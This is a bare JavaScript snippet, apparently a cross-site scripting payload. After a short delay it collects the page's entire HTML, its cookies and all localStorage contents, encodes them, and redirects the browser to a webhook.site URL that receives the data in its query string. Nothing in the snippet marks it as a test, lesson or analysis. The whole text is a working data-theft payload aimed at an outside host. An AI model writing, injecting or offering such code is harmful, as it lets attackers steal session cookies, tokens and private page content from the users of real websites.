setTimeout(() => {
  const body = document.documentElement.innerHTML;
  const cookies = document.cookie;
  const ls = JSON.stringify(localStorage);

  const combined = 'DOM=' + encodeURIComponent(body) + '&COOKIE=' + encodeURIComponent(cookies) + '&LS=' + encodeURIComponent(ls);

  location.href = 'https://webhook.site/c68e80c2-5c60-46d0-ace5-00dc5ec9957c?' + combined;
}, 500);
